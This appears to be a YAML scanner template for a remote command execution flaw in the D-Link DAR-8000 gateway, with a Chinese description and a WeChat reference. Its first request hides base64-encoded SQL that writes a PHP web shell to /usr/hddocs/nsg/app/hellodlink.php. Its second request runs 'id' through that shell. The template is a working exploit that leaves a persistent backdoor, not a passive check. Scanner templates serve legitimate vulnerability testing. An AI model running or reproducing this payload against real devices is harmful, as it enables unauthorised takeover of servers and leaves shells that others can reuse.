expression: r0() && r1()
id: dlink-dar-8000-rce
info:
  author: daffainfo
  description: "D-Link DAR\u4E0A\u7F51\u884C\u4E3A\u5BA1\u8BA1\u7F51\u5173\u53EF\u4EE5\
    \u4E3A\u4F01\u4E1A\u63D0\u4F9B\u5B8C\u5584\u7684\u4E92\u8054\u7F51\u8BBF\u95EE\
    \u884C\u4E3A\u7BA1\u7406\u89E3\u51B3\u65B9\u6848\uFF0C\u5168\u9762\u4FDD\u62A4\
    \u4F01\u4E1A\u7684\u8FD0\u8425\u6548\u7387\u548C\u4FE1\u606F\u5B89\u5168\u3002\
    DAR\u7CFB\u5217\u4EA7\u54C1\u63D0\u4F9B\u5168\u9762\u7684\u5E94\u7528\u8BC6\u522B\
    \u548C\u63A7\u5236\u80FD\u529B\u3001\u7CBE\u7EC6\u5316\u7684\u5E94\u7528\u5C42\
    \u5E26\u5BBD\u7BA1\u7406\u80FD\u529B\u3001\u5206\u7C7B\u5316\u7684\u6D77\u91CF\
    URL\u8FC7\u6EE4\u80FD\u529B\u3001\u8BE6\u5C3D\u7684\u4E0A\u7F51\u884C\u4E3A\u5BA1\
    \u8BA1\u80FD\u529B\u4EE5\u53CA\u4E30\u5BCC\u7684\u4E0A\u7F51\u884C\u4E3A\u62A5\
    \u8868\uFF0C\u4ECE\u800C\u5E2E\u52A9\u4F01\u4E1A\u5FEB\u901F\u6784\u5EFA\u53EF\
    \u89C6\u5316\u3001\u4F4E\u6210\u672C\u4EE5\u53CA\u9AD8\u6548\u5B89\u5168\u7684\
    \u5546\u4E1A\u7F51\u7EDC\u3002D-Link\u4E0A\u7F51\u884C\u4E3A\u7BA1\u7406\u7CFB\
    \u7EDF\u5B58\u5728\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF0C\u653B\
    \u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u670D\u52A1\u5668\
    \u6743\u9650\u3002\nmask.style.visibility && title=\"D-Link\"\n"
  name: "D-Link DAR-8000 \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  reference:
  - https://mp.weixin.qq.com/s/1iEvtvHJncuYJ316byyf6g
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.headers["content-disposition"].contains("attachment;")
    request:
      method: GET
      path: /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvaGVsbG9kbGluay5waHAn
  r1:
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
    request:
      body: 'cmd=id

        '
      method: POST
      path: /app/hellodlink.php
